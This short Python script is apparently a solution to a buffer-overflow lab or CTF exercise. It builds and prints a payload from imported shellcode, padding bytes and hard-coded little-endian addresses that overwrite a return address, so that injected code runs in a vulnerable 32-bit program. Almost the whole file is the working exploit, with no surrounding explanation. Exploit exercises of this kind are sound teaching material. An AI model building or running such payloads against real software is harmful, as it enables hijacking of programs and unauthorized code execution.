
import sys
from shellcode import shellcode

addr = 0xFFF6B978.to_bytes(4, "little") #system address
ret_addr= 0xfff6b9ac.to_bytes(4,"little") #return address for main +4
sys.stdout.buffer.write( shellcode + b"A"*3 + addr + ret_addr)
